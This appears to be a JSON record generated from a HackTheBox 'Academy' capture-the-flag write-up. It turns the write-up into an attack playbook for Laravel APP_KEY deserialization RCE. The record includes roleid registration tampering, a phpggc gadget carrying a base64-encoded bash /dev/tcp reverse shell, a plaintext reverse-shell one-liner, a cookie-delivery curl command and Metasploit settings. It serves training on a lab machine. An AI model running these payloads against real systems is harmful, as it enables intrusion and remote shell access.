@@ -1,0 +1,887 @@
+{
+  "writeup_id": "Htb_Academy",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_laravel_deserialization",
+    "primary_services": [
+      "http",
+      "mysql",
+      "ssh"
+    ],
+    "port_signature": "22+80+33060",
+    "service_combination": "ssh+apache+mysql",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "privilege_escalation_via_registration",
+    "privilege_path": "web_admin_to_rce_to_root",
+    "attack_complexity": "easy",
+    "estimated_time": "45-60 minutes",
+    "scenario_confidence": 0.9,
+    "distinguishing_factors": [
+      "laravel_app_key_exposure",
+      "role_based_registration_bypass",
+      "serialized_payload_injection"
+    ],
+    "environmental_clues": [
+      "redirect_to_domain_name",
+      "php_registration_form",
+      "admin_panel_discovery",
+      "mysql_x_protocol_port"
+    ],
+    "similar_scenarios": [
+      "htb_academy_easy",
+      "laravel_rce_boxes"
+    ],
+    "unique_aspects": [
+      "roleid_parameter_manipulation",
+      "laravel_crash_page_info_disclosure",
+      "composer_sudo_privilege_escalation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Parameter Manipulation",
+        "success_reason": "Registration form included hidden roleid parameter that could be modified",
+        "prerequisite_indicators": [
+          "web_application_with_registration",
+          "role_based_access_control",
+          "client_side_parameter_validation"
+        ],
+        "recognition_patterns": [
+          "hidden form fields in POST requests",
+          "roleid or similar parameters",
+          "different access levels mentioned"
+        ],
+        "failure_modes": [
+          "server_side_validation_enforced",
+          "parameter_signing_implemented",
+          "no_privileged_roles_available"
+        ],
+        "environmental_factors": [
+          "insufficient_input_validation",
+          "trust_in_client_side_controls",
+          "lack_of_authorization_checks"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "Laravel Token Deserialization",
+        "success_reason": "APP_KEY exposed in error page enabling payload signing",
+        "prerequisite_indicators": [
+          "laravel_framework_detected",
+          "debug_mode_enabled",
+          "error_pages_accessible"
+        ],
+        "recognition_patterns": [
+          "Laravel error pages with stack traces",
+          "APP_KEY visible in environment variables",
+          "base64 encoded key format"
+        ],
+        "failure_modes": [
+          "debug_mode_disabled",
+          "app_key_not_exposed",
+          "deserialization_patched"
+        ],
+        "environmental_factors": [
+          "development_environment_exposed",
+          "verbose_error_reporting",
+          "unpatched_laravel_version"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "dev-staging-01.academy.htb subdomain",
+        "discovery_method": "Admin panel access via role escalation",
+        "why_critical": "Exposed Laravel application with debug information",
+        "how_to_recognize": [
+          "subdomain references in admin panels",
+          "development/staging naming patterns",
+          "internal application mentions"
+        ],
+        "follow_up_actions": [
+          "add_subdomain_to_hosts_file",
+          "check_for_error_pages",
+          "look_for_debug_information"
+        ]
+      },
+      {
+        "discovery": "Laravel APP_KEY in error page",
+        "discovery_method": "Accessing misconfigured staging environment",
+        "why_critical": "Enables deserialization attacks for RCE",
+        "how_to_recognize": [
+          "base64 encoded keys in error output",
+          "environment variable dumps",
+          "Laravel debug pages"
+        ],
+        "follow_up_actions": [
+          "test_deserialization_exploit",
+          "craft_malicious_payload",
+          "use_metasploit_laravel_module"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "anonymous_user",
+        "escalation_method": "Role_Parameter_Manipulation",
+        "why_possible": "Registration form trusted client-side roleid parameter",
+        "recognition_signs": [
+          "hidden_form_parameters",
+          "role_based_access_mentioned",
+          "different_login_endpoints"
+        ],
+        "exploitation_path": "Intercept Registration → Modify roleid=1 → Admin Access"
+      },
+      {
+        "privilege_level": "admin_web_access",
+        "escalation_method": "Laravel_Deserialization_RCE",
+        "why_possible": "Staging environment exposed APP_KEY in error messages",
+        "recognition_signs": [
+          "laravel_error_pages",
+          "app_key_in_environment_dump",
+          "deserialization_vulnerable_version"
+        ],
+        "exploitation_path": "Extract APP_KEY → Craft Payload → HTTP Header Injection → RCE"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80,33060 open on Linux host with HTTP redirect to domain",
+        "decision": "Add domain to hosts file and enumerate web application thoroughly",
+        "reasoning": "HTTP redirect indicates virtual hosting, need proper domain resolution for full enumeration",
+        "confidence": 0.95,
+        "alternatives": [
+          {
+            "option": "direct_ip_enumeration",
+            "when": "if domain enumeration fails"
+          },
+          {
+            "option": "subdomain_bruteforce",
+            "when": "after initial web enum"
+          }
+        ],
+        "success_indicators": [
+          "web_application_loads",
+          "registration_functionality_found",
+          "admin_panel_discovered"
+        ],
+        "next_decision": "analyze_registration_parameters"
+      },
+      {
+        "step": 2,
+        "situation": "Found registration form with hidden roleid parameter",
+        "decision": "Manipulate roleid parameter to gain admin privileges",
+        "reasoning": "Hidden parameters often control authorization levels",
+        "confidence": 0.85,
+        "prerequisites": [
+          "registration_form_identified",
+          "burp_proxy_configured"
+        ],
+        "success_indicators": [
+          "admin_panel_access_gained",
+          "new_vhost_discovered"
+        ],
+        "failure_fallbacks": [
+          "sql_injection_testing",
+          "directory_bruteforce",
+          "credential_bruteforce"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Discovered new virtual host showing Laravel error page with APP_KEY exposed",
+        "decision": "Exploit Laravel deserialization vulnerability using exposed APP_KEY",
+        "reasoning": "Laravel APP_KEY exposure enables CVE-2018-15133 deserialization attack",
+        "confidence": 0.9,
+        "prerequisites": [
+          "app_key_extracted",
+          "laravel_framework_confirmed"
+        ],
+        "success_indicators": [
+          "command_execution_achieved",
+          "reverse_shell_obtained"
+        ],
+        "failure_fallbacks": [
+          "other_laravel_vulns",
+          "file_inclusion_attempts",
+          "config_file_enumeration"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_parameter_manipulation_succeeds": {
+        "action": "access_admin_panel_and_enumerate",
+        "tools": [
+          "burp_suite",
+          "browser"
+        ],
+        "next_phase": "search_for_additional_attack_surfaces"
+      },
+      "if_laravel_error_found": {
+        "action": "extract_app_key_and_exploit_deserialization",
+        "tools": [
+          "metasploit",
+          "custom_php_script"
+        ],
+        "next_phase": "establish_persistent_access"
+      },
+      "if_shell_obtained": {
+        "action": "enumerate_system_for_privilege_escalation",
+        "purpose": "find_database_credentials_and_user_accounts",
+        "tools": [
+          "linpeas",
+          "manual_enumeration"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_intercept_registration_requests",
+        "reasoning": "hidden_parameters_often_control_authorization",
+        "applicability": "web_applications_with_user_registration"
+      },
+      {
+        "rule": "check_error_pages_for_sensitive_information",
+        "reasoning": "debug_pages_frequently_expose_keys_and_configs",
+        "applicability": "development_or_staging_environments"
+      },
+      {
+        "rule": "prioritize_framework_specific_exploits_when_keys_exposed",
+        "reasoning": "exposed_secrets_enable_high_confidence_attacks",
+        "applicability": "laravel_django_rails_applications"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Parameter Manipulation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "form_based_registration",
+          "hidden_parameters_in_requests"
+        ],
+        "success_indicators": [
+          "roleid_parameter_present",
+          "privilege_escalation_via_parameter",
+          "admin_access_granted"
+        ],
+        "incompatible_with": [
+          "server_side_validation",
+          "parameter_whitelisting",
+          "role_verification"
+        ],
+        "confidence_boosters": [
+          "default_role_values",
+          "numeric_role_identifiers",
+          "lack_of_input_validation"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "Laravel Debug Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "laravel_framework_detected",
+          "debug_mode_enabled",
+          "app_key_exposed"
+        ],
+        "success_indicators": [
+          "laravel_error_page_visible",
+          "app_key_in_error_output",
+          "serialized_payload_accepted"
+        ],
+        "incompatible_with": [
+          "debug_mode_disabled",
+          "app_key_rotated",
+          "error_pages_customized"
+        ],
+        "confidence_boosters": [
+          "default_laravel_configuration",
+          "development_environment",
+          "verbose_error_messages"
+        ],
+        "typical_success_rate": 0.78,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Virtual Host Discovery",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_present",
+          "multiple_domains_configured",
+          "dns_redirect_detected"
+        ],
+        "success_indicators": [
+          "additional_vhosts_discovered",
+          "different_applications_found",
+          "expanded_attack_surface"
+        ],
+        "incompatible_with": [
+          "single_domain_configuration",
+          "vhost_enumeration_blocked",
+          "strict_host_validation"
+        ],
+        "confidence_boosters": [
+          "subdomain_references_in_source",
+          "multiple_ssl_certificates",
+          "dns_zone_transfer_allowed"
+        ],
+        "typical_success_rate": 0.72,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "Database Credential Reuse",
+        "mitre_id": "T1078",
+        "required_services": [
+          "mysql",
+          "ssh"
+        ],
+        "required_ports": [
+          3306,
+          33060,
+          22
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "database_credentials_obtained",
+          "ssh_service_available",
+          "credential_reuse_likely"
+        ],
+        "success_indicators": [
+          "ssh_login_successful",
+          "database_access_granted",
+          "user_account_compromise"
+        ],
+        "incompatible_with": [
+          "unique_passwords_enforced",
+          "ssh_key_only_auth",
+          "account_lockout_policies"
+        ],
+        "confidence_boosters": [
+          "default_database_passwords",
+          "shared_service_accounts",
+          "weak_password_policies"
+        ],
+        "typical_success_rate": 0.58,
+        "estimated_time": "1-3 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "laravel_framework": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "laravel",
+          "php",
+          "symfony"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "mysql_database": {
+        "port_indicators": [
+          3306,
+          33060
+        ],
+        "service_indicators": [
+          "mysql",
+          "mysqlx"
+        ],
+        "banner_indicators": [
+          "MySQL",
+          "MariaDB"
+        ],
+        "confidence_threshold": 0.88
+      },
+      "ubuntu_linux": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "OpenSSH"
+        ],
+        "confidence_threshold": 0.82
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "parameter_manipulation",
+          "when": "web_forms_detected",
+          "reason": "quick_privilege_escalation_opportunity"
+        },
+        {
+          "attack": "virtual_host_discovery",
+          "when": "dns_redirect_detected",
+          "reason": "expands_attack_surface_significantly"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "laravel_debug_exploitation",
+          "when": "laravel_framework_detected",
+          "reason": "high_impact_but_requires_debug_mode"
+        },
+        {
+          "attack": "credential_reuse",
+          "when": "database_credentials_found",
+          "reason": "common_but_not_guaranteed"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Parameter Manipulation - Role Escalation",
+        "mitre_id": "T1068",
+        "category": "privilege_escalation",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "Burp Suite",
+            "command_template": "Intercept POST request and modify roleid parameter",
+            "actual_command": "POST /register.php - Change roleid=0 to roleid=1",
+            "output_pattern": "Successful registration with elevated privileges",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "web_application_with_registration",
+          "hidden_role_parameter",
+          "insufficient_input_validation"
+        ],
+        "success_indicators": [
+          "admin_panel_access_granted",
+          "elevated_functionality_available",
+          "additional_information_disclosed"
+        ],
+        "common_failures": [
+          "server_side_validation_present",
+          "role_parameter_ignored",
+          "session_management_prevents_escalation"
+        ],
+        "follow_up_techniques": [
+          "information_disclosure",
+          "subdomain_enumeration",
+          "credential_harvesting"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Laravel Token Deserialization RCE",
+        "mitre_id": "T1203",
+        "category": "execution",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "Metasploit",
+            "command_template": "use exploit/unix/http/laravel_token_unserialize_exec",
+            "actual_command": "set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=; set RHOSTS 10.10.10.215; set vhost dev-staging-01.academy.htb",
+            "output_pattern": "Command shell session opened",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "phpggc",
+            "command_template": "/opt/phpggc/phpggc Laravel/RCE1 \"{payload}\"",
+            "actual_command": "/opt/phpggc/phpggc Laravel/RCE1 \"system('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgMD4mMQo=\" | base64 -d | bash');\"",
+            "success_factors": [
+              "app_key_available",
+              "laravel_debug_enabled"
+            ],
+            "effectiveness_rating": 4
+          },
+          {
+            "name": "curl",
+            "command_template": "curl -s -H \"Cookie: laravel_session={payload}\" {target_url}",
+            "actual_command": "curl -s -H \"Cookie: laravel_session=$(php gen_serialized.php);\" http://dev-staging-01.academy.htb",
+            "success_factors": [
+              "valid_serialized_payload",
+              "vulnerable_laravel_version"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "laravel_application_accessible",
+          "app_key_disclosed",
+          "vulnerable_laravel_version",
+          "debug_mode_enabled"
+        ],
+        "success_indicators": [
+          "reverse_shell_connection_established",
+          "command_execution_confirmed",
+          "www-data_user_access_obtained"
+        ],
+        "common_failures": [
+          "app_key_not_available",
+          "patched_laravel_version",
+          "payload_encoding_issues",
+          "network_filtering_blocks_reverse_shell"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "credential_harvesting",
+          "lateral_movement"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Virtual Host Discovery",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "Manual Inspection",
+            "command_template": "Review admin panel for subdomain references",
+            "actual_command": "Access /admin.php after privilege escalation",
+            "output_pattern": "dev-staging-01.academy.htb subdomain discovered",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "admin_panel_access",
+          "application_references_subdomains",
+          "insufficient_access_controls"
+        ],
+        "success_indicators": [
+          "new_subdomains_identified",
+          "additional_attack_surface_discovered",
+          "expanded_target_scope"
+        ],
+        "common_failures": [
+          "no_subdomain_references_present",
+          "subdomains_not_accessible",
+          "dns_resolution_issues"
+        ],
+        "follow_up_techniques": [
+          "subdomain_enumeration",
+          "vulnerability_assessment",
+          "application_fingerprinting"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Metasploit",
+        "use_case": "laravel_deserialization_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "rapid_exploitation",
+          "payload_generation"
+        ],
+        "alternatives": [
+          "manual_phpggc",
+          "custom_php_scripts"
+        ],
+        "best_practices": [
+          "verify_app_key_before_exploitation",
+          "test_payload_encoding",
+          "use_appropriate_reverse_shell_payload"
+        ]
+      },
+      {
+        "tool": "phpggc",
+        "use_case": "php_deserialization_payload_generation",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "medium",
+        "essential_for": [
+          "custom_php_exploitation",
+          "manual_deserialization_attacks"
+        ],
+        "alternatives": [
+          "metasploit_modules",
+          "custom_serialization_scripts"
+        ],
+        "best_practices": [
+          "understand_target_framework_version",
+          "test_payload_locally_first",
+          "handle_special_characters_properly"
+        ]
+      },
+      {
+        "tool": "Burp Suite",
+        "use_case": "parameter_manipulation",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing",
+          "request_modification"
+        ],
+        "alternatives": [
+          "curl",
+          "custom_scripts",
+          "browser_dev_tools"
+        ],
+        "best_practices": [
+          "intercept_all_form_submissions",
+          "test_hidden_parameters",
+          "validate_server_response_changes"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "laravel_rce_via_admin_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Register normal user account via /register.php",
+            "purpose": "Establish baseline access",
+            "expected_output": "User account created successfully"
+          },
+          {
+            "step": 2,
+            "command": "Intercept registration POST and change roleid=0 to roleid=1",
+            "purpose": "Escalate privileges during registration",
+            "expected_output": "Admin account created with elevated privileges"
+          },
+          {
+            "step": 3,
+            "command": "Login to /admin.php with escalated account",
+            "purpose": "Access admin functionality",
+            "expected_output": "Academy Launch Planner dashboard access"
+          },
+          {
+            "step": 4,
+            "command": "Identify dev-staging-01.academy.htb subdomain",
+            "purpose": "Discover additional attack surface",
+            "expected_output": "New virtual host identified"
+          },
+          {
+            "step": 5,
+            "command": "Visit dev-staging-01.academy.htb to trigger Laravel error",
+            "purpose": "Extract APP_KEY from debug output",
+            "expected_output": "Laravel crash page with APP_KEY disclosed"
+          },
+          {
+            "step": 6,
+            "command": "use exploit/unix/http/laravel_token_unserialize_exec in msfconsole",
+            "purpose": "Exploit Laravel deserialization vulnerability",
+            "expected_output": "Reverse shell as www-data user"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "15-25 minutes"
+      },
+      {
+        "sequence_name": "manual_laravel_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Extract APP_KEY from Laravel debug page",
+            "purpose": "Obtain required cryptographic key",
+            "expected_output": "APP_KEY: dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
+          },
+          {
+            "step": 2,
+            "command": "echo \"bash -i >& /dev/tcp/10.10.14.19/443 0>&1\" | base64",
+            "purpose": "Encode reverse shell payload",
+            "expected_output": "Base64 encoded payload string"
+          },
+          {
+            "step": 3,
+            "command": "/opt/phpggc/phpggc Laravel/RCE1 \"system('echo \"{b64_payload}\" | base64 -d | bash');\"",
+            "purpose": "Generate serialized payload",
+            "expected_output": "Serialized PHP object for exploitation"
+          },
+          {
+            "step": 4,
+            "command": "curl -s -H \"Cookie: laravel_session={payload}\" http://dev-staging-01.academy.htb",
+            "purpose": "Deliver payload via HTTP cookie",
+            "expected_output": "Reverse shell connection established"
+          }
+        ],
+        "success_rate": 0.8,
+        "typical_duration": "10-20 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Academy",
+      "difficulty": "Easy",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2020-11-07",
+      "author": "egre55, mrb3n",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "web_application",
+        "deserialization",
+        "credential_reuse"
+      ],
+      "key_vulnerabilities": [
+        "registration_bypass",
+        "laravel_deserialization",
+        "credential_exposure"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "php_deserialization",
+        "laravel_exploitation",
+        "credential_hunting"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_testing",
+        "php_basics",
+        "serialization_concepts"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "deserialization",
+        "privilege_escalation",
+        "credential_access"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_registration_logic",
+        "protect_app_keys",
+        "credential_management"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Knife",
+        "Previse",
+        "Writer"
+      ],
+      "similarity_reasons": [
+        "web_application_focus",
+        "credential_reuse",
+        "linux_privilege_escalation"
+      ],
+      "unique_aspects": [
+        "laravel_framework",
+        "app_key_exposure",
+        "composer_sudo_escalation"
+      ],
+      "difficulty_factors": [
+        "multiple_credential_sources",
+        "framework_specific_exploitation"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T20:58:26.810328",
+    "original_file": "0xdf_writeups/Htb Academy.md",
+    "content_length": 24487,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
